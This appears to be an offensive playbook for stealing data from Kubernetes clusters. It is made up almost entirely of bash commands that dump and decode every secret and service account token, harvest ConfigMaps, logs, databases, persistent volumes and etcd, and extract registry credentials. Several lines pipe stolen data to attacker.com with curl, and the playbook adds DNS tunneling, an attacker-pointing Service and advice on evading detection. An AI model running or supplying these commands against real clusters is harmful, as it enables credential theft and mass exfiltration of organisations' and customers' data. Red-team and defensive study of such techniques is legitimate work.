# Kubernetes Data Exfiltration

Techniques for exfiltrating data from Kubernetes clusters and connected services.

## Secret Extraction

### Extract All Secrets

```bash
# Get all secrets across cluster
kubectl get secrets --all-namespaces -o json > all-secrets.json

# Parse and decode
cat all-secrets.json | jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name, data: .data}' | \
  jq 'map_values(if type == "object" then map_values(@base64d) else . end)' > decoded-secrets.txt

# Or query specific secret
kubectl get secret {secret-name} -o jsonpath='{.data}' | \
  jq 'map_values(@base64d)'

# Common secrets containing:
# - Database passwords
# - API tokens
# - OAuth credentials
# - Encryption keys
# - TLS certificates

# Extract specific types
kubectl get secrets --all-namespaces -o json | \
  jq '.items[] | select(.type == "kubernetes.io/basic-auth")'

# Docker registry credentials
kubectl get secrets --all-namespaces -o json | \
  jq '.items[] | select(.type == "kubernetes.io/dockercfg")'
```

### ServiceAccount Token Extraction

```bash
# Get all service account tokens
kubectl get secrets --all-namespaces -o json | \
  jq '.items[] | select(.type == "kubernetes.io/service-account-token") | 
  {namespace: .metadata.namespace, sa: .metadata.annotations."kubernetes.io/service-account.name", 
  token: .data.token}'

# Decode and save tokens
kubectl get secrets --all-namespaces -o json | \
  jq '.items[] | select(.type == "kubernetes.io/service-account-token") | .data.token' | \
  while read token; do
    echo "$token" | base64 -d >> all-tokens.txt
  done

# Each token can be used independently to access cluster
```

## ConfigMap Exfiltration

```bash
# Extract all ConfigMaps
kubectl get configmaps --all-namespaces -o json > all-configmaps.json

# ConfigMaps often contain:
# - Application configuration
# - Database connection strings
# - API endpoints
# - Feature flags (may expose internal systems)

# Search for sensitive patterns
kubectl get configmaps --all-namespaces -o json | \
  jq '.items[] | select(.data | tostring | test("password|secret|api|key|token|url|host|db"; "i"))'

# Get specific ConfigMap
kubectl get configmap {name} -n {namespace} -o jsonpath='{.data}' | jq '.'

# Dump all config data
for cm in $(kubectl get cm --all-namespaces -o name); do
  kubectl get $cm -o jsonpath='{.data}' | jq '.'
done > all-configs.json
```

## Pod Logs Exfiltration

```bash
# Extract logs from all pods
for pod in $(kubectl get pods --all-namespaces -o name); do
  echo "=== Pod: $pod ==="
  kubectl logs $pod --all-containers=true 2>/dev/null
done > all-pod-logs.txt

# Logs often contain:
# - Stack traces with code paths
# - Database queries
# - Authentication attempts (failed credentials)
# - API calls
# - User data in error messages

# Get logs for specific namespace
kubectl logs --all-namespaces -n production --tail=1000 | tee production-logs.txt

# Get logs from crashed containers
kubectl logs {pod} --previous

# Combine pod logs and exfiltrate
kubectl logs --all-namespaces --all-containers=true | \
  curl -X POST --data-binary @- http://attacker.com/logs
```

## Database Access via Kubernetes

### Database Credentials in Secrets

```bash
# Find database secret
kubectl get secret -o json | jq '.items[] | select(.data | keys[] | contains("password")) | .data'

# Extract database credentials
DB_SECRET=$(kubectl get secret db-credentials -o jsonpath='{.data.connection-string}' | base64 -d)

# Parse connection string
# Format: postgresql://user:password@host:port/database

USER=$(echo $DB_SECRET | sed -n 's/.*:\/\/\([^:]*\).*/\1/p')
PASSWORD=$(echo $DB_SECRET | sed -n 's/.*:\/\/[^:]*:\([^@]*\).*/\1/p')
HOST=$(echo $DB_SECRET | sed -n 's/.*@\([^:]*\).*/\1/p')
PORT=$(echo $DB_SECRET | sed -n 's/.*:\([0-9]*\).*/\1/p')

# Connect to database
psql postgresql://$USER:$PASSWORD@$HOST:$PORT/database
```

### Query Database from Pod

```bash
# Create pod with database client
kubectl run db-client --image=postgres:latest --rm -it -- \
  psql postgresql://$USER:$PASSWORD@database.production:5432/prod_db

# Or with MySQL
kubectl run mysql-client --image=mysql:latest --rm -it -- \
  mysql -h database.production -u $USER -p$PASSWORD

# Execute queries and exfiltrate
QUERY="SELECT * FROM customers, orders, transactions;"

kubectl run db-exfil --image=postgres:latest --rm -it -- \
  psql postgresql://$USER:$PASSWORD@database:5432/prod_db -c "$QUERY" | \
  tee exfil-data.csv
```

### Port Forward to Database

```bash
# If database isn't directly accessible
# Use kubectl port-forward to expose it

kubectl port-forward svc/database 5432:5432 &

# Now connect to localhost
psql postgresql://user:password@localhost:5432/database

# Can access database as if local
# All data accessible

# Download entire database
pg_dump postgresql://user:password@localhost:5432/database | gzip > database-backup.sql.gz
```

## Persistent Volume Data Access

```bash
# Find persistent volumes
kubectl get pv -o json | jq '.items[] | {name: .metadata.name, size: .spec.capacity, path: .spec}'

# Check which pods use volumes
kubectl get pods --all-namespaces -o json | jq '.items[] | {name: .metadata.name, volumes: .spec.volumes}'

# If you can create pods
# Mount the persistent volume
cat > pv-access.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: pv-reader
spec:
  containers:
  - name: reader
    image: ubuntu
    volumeMounts:
    - name: data
      mountPath: /data
  volumes:
  - name: data
    persistentVolumeClaim:
      claimName: {pvc-name}
EOF

kubectl apply -f pv-access.yaml
kubectl exec -it pv-reader -- find /data -type f -exec cat {} \;

# Access all data on persistent volume
```

## Etcd Data Extraction

```bash
# If etcd is accessible (port 2379)
# All cluster data can be extracted

ETCDCTL_API=3 etcdctl --endpoints=http://etcd:2379 get "" --prefix | tee etcd-dump.txt

# Includes:
# - All secrets
# - All configuration
# - All resource definitions
# - RBAC policies

# Export to files
ETCDCTL_API=3 etcdctl --endpoints=http://etcd:2379 \
  snapshot save /tmp/etcd-backup.db

# Restore snapshot for analysis
ETCDCTL_API=3 etcdctl snapshot restore /tmp/etcd-backup.db \
  --data-dir ./etcd-data

# Access restored data
ETCDCTL_API=3 etcdctl \
  --data-dir ./etcd-data \
  get "" --prefix
```

## API Server Audit Logs

```bash
# Audit logs contain all API activity
# May contain sensitive operations

# Check audit log location (typically /var/log/kubernetes/audit.log)
cat /var/log/kubernetes/audit.log | grep -i "secret\|password\|token" | jq '.'

# Or extract from persistent volume if mounted
kubectl exec -it audit-reader -- cat /var/log/kubernetes/audit.log

# Parse audit log for interesting activity
cat audit.log | jq 'select(.verb == "get" and .objectRef.kind == "Secret") | {user: .user.username, secret: .objectRef.name}'

# Get complete audit history
kubectl get events --all-namespaces --sort-by='.lastTimestamp'
```

## Container Registry Access

```bash
# If Kubernetes has access to container registry
# You can extract secrets, credentials, images

# Check image pull secrets
kubectl get imagepullsecrets --all-namespaces

# Extract registry credentials
kubectl get secret {registry-secret} -o jsonpath='{.data.\.dockercfg}' | base64 -d | jq '.'

# Use credentials to access registry
# Docker, Artifactory, ECR, GCR, ACR, etc.

# List all images in registry
docker images --all

# Save images
docker save {image} -o {image}.tar

# Extract image layers and examine filesystem
tar -xf {image}.tar
cat manifest.json | jq '.[] | .Layers'
```

## Kubernetes API Data Leakage

### Resource Enumeration Dump

```bash
# Get all Kubernetes resources
kubectl get all --all-namespaces -o json > all-resources.json

# Includes pods, services, deployments, statefulsets, daemonsets
# May contain sensitive application information

# Extract all describe information
kubectl describe nodes > nodes.txt
kubectl describe pv >> nodes.txt
kubectl describe pvc >> nodes.txt

# Get resource usage data
kubectl top nodes > resource-usage.txt
kubectl top pods --all-namespaces >> resource-usage.txt
```

## Backup and Snapshot Access

```bash
# Backups often stored in cluster
# Check for backup locations

find / -name "*.backup" -o -name "*.snapshot" -o -name "*.sql" 2>/dev/null

# Check for backup directories
ls -la /backups/
ls -la /data/backups/
ls -la /var/backups/

# Extract backup data
find / -name "*backup*" -type f -size +1M | head -20 | while read file; do
  echo "=== Backup: $file ==="
  file $file
  tar -tzf $file | head -10  # If tarball
  strings $file | grep -i "database\|table\|user" | head -10  # If binary
done
```

## External Service Credential Extraction

```bash
# Pod environment often contains external service credentials
# For databases, APIs, cloud services

kubectl get pod {pod-name} -o env | grep -i "api\|key\|secret\|password\|token\|url\|host"

# Or examine environment variables directly
kubectl exec {pod} -- env | grep -i "secret\|password\|token\|key"

# Credentials for:
# - External APIs
# - Database services
# - Cloud platforms (AWS, GCP, Azure)
# - Message queues
# - Cache services (Redis, Memcached)
```

## Exfiltration Methods

```bash
# Direct exfil via curl/wget
kubectl exec {pod} -- sh -c 'cat /data/sensitive | curl -X POST --data-binary @- http://attacker.com/data'

# Via DNS tunneling
# If firewall blocks outbound HTTP/HTTPS

kubectl exec {pod} -- sh -c 'cat /data | nslookup -type=TXT -'

# Via Kubernetes API to attacker-controlled service
# Create service pointing to attacker
cat > attacker-service.yaml << 'EOF'
apiVersion: v1
kind: Service
metadata:
  name: attacker-service
spec:
  externalIPs:
  - attacker.com
  ports:
  - port: 443
    targetPort: 443
EOF

kubectl apply -f attacker-service.yaml
kubectl exec {pod} -- curl https://attacker-service:443/receive --data {data}

# Via sidecar container
# Inject sidecar that continuously exfils data

# Via scheduled job
# Periodic data export to attacker infrastructure
```

## Speed Considerations

```bash
# Large data exfiltration:
# - Compress data 10-30x for structured data
# - Parallel connections if bandwidth allows
# - Spread over time to avoid detection

# Compress before exfil
kubectl exec {pod} -- sh -c 'cat /data | gzip | curl -X POST --data-binary @- http://attacker.com'

# Parallel exfil using multiple pods
for i in {1..10}; do
  kubectl run exfil-$i --image=ubuntu &
  kubectl exec exfil-$i -- curl http://attacker.com/segment-$i
done
```
